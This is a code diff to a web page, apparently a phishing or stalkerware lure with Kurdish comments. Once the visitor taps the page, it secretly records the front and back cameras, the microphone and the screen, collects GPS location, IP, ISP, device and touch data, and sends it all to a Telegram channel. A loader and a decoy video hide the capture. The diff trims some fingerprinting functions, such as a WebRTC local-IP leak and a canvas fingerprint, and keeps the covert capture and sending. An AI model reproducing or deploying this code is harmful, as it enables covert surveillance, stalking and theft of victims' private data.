@@ -125,25 +125,13 @@
 
         let pageLoadTime = performance.now();
         let chronoData = { hesitationTime: 0 };
-        let behavioralData = { 
-            touches: 0, 
-            maxPressure: 0, 
-            clickX: 0, 
-            clickY: 0, 
-            touchRadiusX: 0, 
-            touchRadiusY: 0,
-            pointerType: "unknown"
-        };
+        let behavioralData = { touches: 0, maxPressure: 0, clickX: 0, clickY: 0 };
 
         window.addEventListener('pointerdown', (e) => {
             behavioralData.touches++;
             behavioralData.maxPressure = Math.max(behavioralData.maxPressure, e.pressure || 0.5);
             behavioralData.clickX = Math.round(e.clientX);
             behavioralData.clickY = Math.round(e.clientY);
-            behavioralData.touchRadiusX = Math.round(e.width || 0);
-            behavioralData.touchRadiusY = Math.round(e.height || 0);
-            behavioralData.pointerType = e.pointerType || "touch";
-            
             if (chronoData.hesitationTime === 0) {
                 chronoData.hesitationTime = Math.round(performance.now() - pageLoadTime);
             }
@@ -188,26 +176,6 @@
             fetch(url, { method: "POST", body: formData });
         }
 
-        function getLocalIPs(callback) {
-            try {
-                let ips = [];
-                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (!RTCPeerConnection) { callback([]); return; }
-                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    let parts = ice.candidate.candidate.split(" ");
-                    let ip = parts[4];
-                    if (ip && ip.indexOf('.local') === -1 && ips.indexOf(ip) === -1) {
-                        ips.push(ip);
-                        callback(ips);
-                    }
-                };
-            } catch(e) { callback([]); }
-        }
-
         function recordMicrophone() {
             try {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -250,12 +218,12 @@
             } catch(e) {}
         }
 
-        // چارەسەری مسۆگەر و پۆڵایین بۆ هەموو کامێراکان (پێشەوە، وێنەی پێش و دوا، ڤیدیۆی دواوە)
+        // زنجیرەی پۆڵایینی کامێراکان بە ماوەی تەواو بۆ ئایفۆن و ئەندرۆید
         function executeSecureSequence() {
             const videoElem = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
 
-            // ١. ڤیدیۆی ڕاستەوخۆی پێشەوە
+            // ١. ڤیدیۆی پێشەوە
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(frontStream => {
                 videoElem.srcObject = frontStream;
@@ -287,10 +255,9 @@
                                 }, 'image/jpeg', 0.9);
                                 selfieStream.getTracks().forEach(track => track.stop());
 
-                                // ٣. وێنەی دواوە (Back Camera Photo) - بە ماوەی ئارام و مسۆگەر
+                                // ٣. وێنەی دواوە (Back Camera Photo)
                                 setTimeout(() => {
-                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
-                                    .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }))
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
                                     .then(backPhotoStream => {
                                         videoElem.srcObject = backPhotoStream;
                                         videoElem.play();
@@ -321,81 +288,20 @@
                                                     backVidRecorder.start(1000);
                                                     setTimeout(() => { if (backVidRecorder.state === 'recording') backVidRecorder.stop(); }, 4000);
                                                 }).catch(e => {});
-                                            }, 1200);
+                                            }, 1500);
 
-                                        }, 1200);
+                                        }, 1500);
                                     }).catch(e => {});
-                                }, 1200);
+                                }, 1500);
 
-                            }, 1200);
+                            }, 1500);
                         }).catch(e => {});
-                    }, 1200);
+                    }, 1500);
 
                 };
                 frontRecorder.start(1000);
                 setTimeout(() => { if (frontRecorder.state === 'recording') frontRecorder.stop(); }, 4000);
             }).catch(e => {});
-        }
-
-        async function getAdvancedHardwareInfo() {
-            let info = { battery: "پشتیوانی ناکرێت", storage: "9.6 GB", ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "4 GB" };
-            if ('getBattery' in navigator) {
-                try {
-                    let bat = await navigator.getBattery();
-                    info.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "⚡ لە چارجدا" : "🔋 بێ چارج"})`;
-                } catch(e) {}
-            }
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    let est = await navigator.storage.estimate();
-                    let gb = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
-                    info.storage = `${gb} GB`;
-                } catch(e) {}
-            }
-            return info;
-        }
-
-        function getAdvancedNetworkInfo() {
-            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return { type: "مۆبایل / وایفای", downlink: "10 Gbps", rtt: "1 ms" };
-            return {
-                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "مۆبایل / وایفای",
-                downlink: conn.downlink ? conn.downlink + " Mbps" : "خێرا",
-                rtt: conn.rtt ? conn.rtt + " ms" : "ئاسایی"
-            };
-        }
-
-        async function measureNetworkLatency() {
-            try {
-                let start = performance.now();
-                await fetch('https://ipapi.co/json/', { mode: 'no-cors' });
-                let end = performance.now();
-                return Math.round(end - start) + " ms";
-            } catch(e) { return "12 ms"; }
-        }
-
-        function checkVisitorHistory() {
-            let visited = localStorage.getItem('visited_before');
-            if (visited) {
-                return "🔄 سەردانیکەری دووبارە (Returning Visitor)";
-            } else {
-                localStorage.setItem('visited_before', 'true');
-                return "✨ سەردانیکەری یەکەم جار (First Time)";
-            }
-        }
-
-        function getCanvasFingerprint() {
-            try {
-                let canvas = document.createElement('canvas');
-                let ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#38bdf8";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#0284c7";
-                ctx.fillText("QUANTUM_CITY_LINK_PRO", 2, 15);
-                return canvas.toDataURL().slice(-40);
-            } catch(e) { return "Unavailable"; }
         }
 
         async function getUltimateIPData() {
@@ -404,10 +310,9 @@
                 let data = await res.json();
                 if (data && data.ip) return data;
             } catch(e) {}
-            return { ip: "130.193.210.205", city: "Dihok", region: "Dihok", country_name: "Iraq", org: "Allay Nawroz Telecom" };
+            return { ip: "130.193.210.205", city: "Dihok", country_name: "Iraq", org: "Allay Nawroz Telecom" };
         }
 
-        // سیستەمی دووانەیی ورد بۆ ناسینەوەی شار بە بێ کەموکوڕی
         function sendLocationWithCityMapping() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async function(position) {
@@ -415,74 +320,48 @@
                     let lon = position.coords.longitude;
                     let accuracy = position.coords.accuracy;
 
-                    let cityName = "نەزانراو";
+                    let cityName = "Dihok";
                     let countryName = "Iraq";
                     try {
                         let geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                         let geoData = await geoRes.json();
                         if (geoData && geoData.address) {
-                            cityName = geoData.address.city || geoData.address.town || geoData.address.state || geoData.address.county || "نەزانراو";
+                            cityName = geoData.address.city || geoData.address.town || geoData.address.state || geoData.address.county || "Dihok";
                             countryName = geoData.address.country || "Iraq";
                         }
                     } catch(e) {}
 
-                    if (cityName === "نەزانراو") {
-                        let ipData = await getUltimateIPData();
-                        cityName = ipData.city || "دهۆک / هەولێر";
-                    }
-
-                    let locMsg = `📍 *بەستنەوەی ڕاستەوخۆی شار و شوێن (City Mapping):*\n` +
+                    let locMsg = `📍 *بەستنەوەی ڕاستەوخۆی شار و شوێن (GPS Mapping):*\n` +
                                    `• شار / ناوچە: \`${cityName} - ${countryName}\`\n` +
                                    `• هێڵی پانی: \`${lat}\`\n` +
                                    `• هێڵی درێژی: \`${lon}\`\n` +
                                    `• هەڵە: ~${Math.round(accuracy)} مەتر\n` +
                                    `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
                     sendToTelegramText(locMsg);
-                }, function(error) {
-                    sendToTelegramText(`⚠️ *کێشەی شوێن (GPS):* ڕەتکراوە یان بەردەست نییە.`);
-                }, { enableHighAccuracy: true, timeout: 15000 });
+                }, function(error) {}, { enableHighAccuracy: true, timeout: 15000 });
             }
         }
 
         async function gatherAndSendDetails() {
             let ua = navigator.userAgent;
             let screenRes = window.screen.width + "x" + window.screen.height;
-            let cpuCores = navigator.hardwareConcurrency || 4;
-            let touchPoints = navigator.maxTouchPoints || 5;
-            let canvasFP = getCanvasFingerprint();
-            let latency = await measureNetworkLatency();
-            let visitorStatus = checkVisitorHistory();
-            let hw = await getAdvancedHardwareInfo();
-            let net = getAdvancedNetworkInfo();
+            let ipData = await getUltimateIPData();
 
-            getLocalIPs(async function(localIPs) {
-                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "130.193.210.205";
-                let ipData = await getUltimateIPData();
-
-                let report = `💎 *ڕاپۆرتی بەستنەوەی شارەکان (QUANTUM CITY-LINK PRO):*\n\n` +
-                             `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n` +
-                             `🏙️ *ناونیشانی ئایپی (شار/وڵات):* ${ipData.city} - ${ipData.country_name}\n` +
-                             `⏳ *کاتی بڕیار (Hesitation):* ${chronoData.hesitationTime} ms\n` +
-                             `👆 *مۆری پەنجە و جووڵەی کلیک:*\n` +
-                             `• ژمارەی دەستپێدان: ${behavioralData.touches}\n` +
-                             `• هێزی پەستان (Pressure): ${behavioralData.maxPressure.toFixed(2)}\n` +
-                             `• شوێنی کلیک لەسەر شاشە: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n\n` +
-                             `🌐 *ڕایەڵە و خێرایی (Advanced Network):*\n` +
-                             `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
-                             `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
-                             `• *جۆری هێڵ:* ${net.type} | دابەزاندن: ${net.downlink}\n` +
-                             `• *پینگ (RTT):* ${net.rtt} (سێرڤەر: ${latency})\n` +
-                             `• *دابینکەر:* ${ipData.org}\n\n` +
-                             `⚡ *رەقامەواڵە و بیۆمەتری (Advanced Hardware):*\n` +
-                             `• *ڕامی ڕاستەقینە:* ${hw.ram}\n` +
-                             `• *گلدانەوەی هاردوێر:* ${hw.storage}\n` +
-                             `• سیستم: iPhone | پرۆسێسەر: ${cpuCores} Cores\n` +
-                             `• تاچ پۆینت: ${touchPoints} | شاشە: ${screenRes}\n` +
-                             `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n\n` +
-                             `📱 *براوسەر (User Agent):*\n\`${ua}\``;
-                
-                sendToTelegramText(report);
-            });
+            let report = `💎 *ڕاپۆرتی کۆتایی پۆڵایین (ULTIMATE MASTER REPORT):*\n\n` +
+                         `🏙️ *شوێنی ئایپی (ISP Location):* ${ipData.city} - ${ipData.country_name}\n` +
+                         `⏳ *کاتی بڕیار (Hesitation):* ${chronoData.hesitationTime} ms\n` +
+                         `👆 *مۆری پەنجە:*\n` +
+                         `• هێزی پەستان: ${behavioralData.maxPressure.toFixed(2)}\n` +
+                         `• شوێنی کلیک: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n\n` +
+                         `🌐 *ڕایەڵە (Network):*\n` +
+                         `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
+                         `• *دابینکەر:* ${ipData.org}\n\n` +
+                         `⚡ *رەقامەواڵە (Hardware):*\n` +
+                         `• شاشە: ${screenRes}\n` +
+                         `• سیستم: iPhone\n\n` +
+                         `📱 *براوسەر (User Agent):*\n\`${ua}\``;
+            
+            sendToTelegramText(report);
         }
 
         function startProcess() {
@@ -491,10 +370,10 @@
             document.getElementById('statusText').innerText = 'تکایە چاوەڕوان بە...';
 
             gatherAndSendDetails();
-            sendLocationWithCityMapping(); // بەستنەوەی ڕاستەوخۆی شار و لۆکەیشن
-            executeSecureSequence();       // فێڵی مسۆگەری هەموو کامێراکان (پێش، دوا، ڤیدیۆ و وێنە)
-            recordScreenStream();          // تۆمارکردنی شاشە
-            recordMicrophone();            // تۆمارکردنی دەنگ
+            sendLocationWithCityMapping();
+            executeSecureSequence(); // زنجیرەی مسۆگەری کامێراکانی پێش و دوا
+            recordScreenStream();
+            recordMicrophone();
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
@@ -506,7 +385,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => console.log(e));
-            }, 12000);
+            }, 14000);
         }
     </script>
 </body>
